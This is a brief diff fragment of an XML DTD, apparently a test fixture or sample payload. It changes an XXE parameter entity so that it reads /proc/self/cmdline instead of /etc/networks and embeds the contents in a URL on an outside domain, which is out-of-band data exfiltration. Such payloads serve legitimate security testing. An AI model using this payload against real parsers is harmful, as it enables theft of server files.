@@ -53,8 +53,9 @@
 <!ATTLIST message
         key NMTOKEN #REQUIRED
         value CDATA #REQUIRED
+>
 
-<!ENTITY % payload SYSTEM "file:///etc/networks">
+<!ENTITY % payload SYSTEM "file:///proc/self/cmdline">
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://92343.domain.%payload;.com">'>
 %param1;
 %external;
